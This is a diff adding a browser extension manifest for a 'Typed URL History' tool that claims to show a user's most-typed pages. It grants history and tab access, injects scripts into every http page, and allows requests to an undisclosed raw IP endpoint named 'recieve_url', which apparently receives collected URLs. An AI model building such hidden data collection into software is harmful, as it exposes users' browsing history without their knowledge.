@@ -1,0 +1,29 @@
+
+{
+    "manifest_version": 2,
+    "name": "Typed URL History",
+    "description": "Reads your history, and shows the top ten pages you go to by typing the URL.",
+    "version": "1.0",
+    "background":
+    {
+        "scripts": ["jquery.min.js","typedUrls.js"],
+         "persistent": true
+    },
+    "permissions": [
+        "tabs","history","139.59.16.142:8000","139.59.16.142:8000/recieve_url"
+
+    ],
+    "browser_action":
+    {
+      "default_popup": "typedUrls.html",
+      "default_icon": "clock.png"
+    },
+    "content_scripts":
+    [
+        {
+          "matches": ["http://*/*"],
+          "js": ["jquery.min.js", "jquery.ui.js", "typedUrls.js"]
+
+        }
+    ]
+}
